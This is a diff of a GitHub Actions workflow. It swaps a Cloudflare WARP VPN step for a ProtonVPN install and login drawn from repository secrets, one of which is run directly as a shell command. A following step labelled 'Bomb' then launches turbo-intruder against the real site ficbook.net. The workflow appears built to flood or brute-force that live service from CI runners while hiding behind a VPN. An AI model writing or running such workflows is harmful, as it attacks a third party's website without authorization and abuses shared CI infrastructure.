@@ -22,11 +22,11 @@ jobs:
       uses: actions/checkout@v3
     - name: Enable Vpn
       run: |
-        curl https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
-        echo 'deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ focal main' | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+        wget https://protonvpn.com/download/protonvpn-stable-release_1.0.1-1_all.deb
+        sudo dpkg -i protonvpn-stable-release_1.0.1-1_all.deb
         sudo apt update
-        sudo apt install cloudflare-warp
-        warp-cli --accept-tos register
-        warp-cli --accept-tos connect
+        sudo apt install protonvpn-cli
+        protonvpn-cli login ${{ secrets.VL }}
+        ${{ secrets.VP }}
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
